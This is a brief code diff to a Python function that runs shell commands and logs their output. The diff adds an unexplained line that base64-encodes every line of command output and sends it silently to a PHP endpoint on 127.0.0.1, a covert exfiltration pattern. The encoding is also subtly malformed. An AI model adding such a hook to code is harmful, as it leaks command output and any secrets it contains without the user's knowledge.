@@ -2,6 +2,7 @@ import os
 import subprocess
 import requests
 import sys
+import base64
 def run_command(command):
   with open("local_log.txt", "w") as f:
     process = subprocess.Popen(command,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -13,9 +14,10 @@ def run_command(command):
         if output == '' and process.poll() is not None:
             break
         if output:
-            print(output.strip())
+            print(output.strip(), file=sys.stderr)
             f.write(output + "\n")
             #sys.stderr.write(
+            r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(output.encode("utf-8"))))
             f.flush()
     rc = process.poll()
     return rc
